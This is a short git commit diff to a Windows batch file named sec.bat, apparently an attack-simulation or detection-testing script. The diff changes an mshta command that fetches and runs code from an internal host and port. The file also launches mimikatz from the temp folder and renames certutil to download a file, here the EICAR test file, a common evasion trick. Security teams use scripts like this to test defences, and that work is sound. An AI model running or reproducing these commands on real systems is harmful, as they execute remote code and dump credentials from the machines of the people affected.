502b4c8660da824f70e6fcaaf24c3d301966749a
inwestallis <inwestallis@gmail.com>
2020-05-23 15:51:39 +0300

    Update sec.bat

--- sec.bat
+++ sec.bat
@@ -1,4 +1,4 @@
-mshta http://10.0.0.20:9999/n4sZL
+mshta http://10.0.0.20:9994/9v0qx
 %Temp%\mimikatz.exe
 copy %windir%\system32\certutil.exe %temp%\cr.tmp
 %temp%\cr.tmp -urlcache -split -f http://2016.eicar.org/download/eicar.com.txt %Temp%\eicar.com.txt
